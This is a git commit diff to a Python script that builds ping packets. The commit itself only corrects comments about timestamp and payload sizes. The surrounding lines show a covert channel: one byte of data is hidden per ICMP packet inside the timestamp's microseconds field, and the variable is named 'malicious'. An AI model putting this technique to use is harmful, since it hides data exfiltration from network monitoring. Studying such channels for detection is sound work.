b0346f349d4baef858f9b05ab803cf1a2152bb2d
hoangdanhnhat <luftheone@gmail.com>
2025-04-20 15:33:42 +0700

    adjust: 16 byte timestamp instead of 8 byte

--- sender-1byte-per-packet.py
+++ sender-1byte-per-packet.py
@@ -10,13 +10,13 @@ def build_ping_packet(dst_ip, identifier, sequence_number, byte):
     microseconds_hex = hex(microseconds)[2:-2] + byte
     malicious_mircoseconds = int(microseconds_hex, 16)
 
-    # Create timestamp (8 bytes) - seconds and microseconds
+    # Create timestamp (16 bytes) - seconds and microseconds
     timestamp = struct.pack('!QQ', seconds, malicious_mircoseconds) # "!" for network byte order (big-endian): "Q" for 8 byte unsigned interger
 
     # Create pattern to fill the payload (after timestamp)
     pattern = bytes(range(0x10, 0x10 + 40))  # 40 bytes: 0x10 to 0x37
 
-    # Final payload: timestamp + pattern (total 48 bytes)
+    # Final payload: timestamp + pattern (total 56 bytes)
     payload = timestamp + pattern
 
     # Build full packet
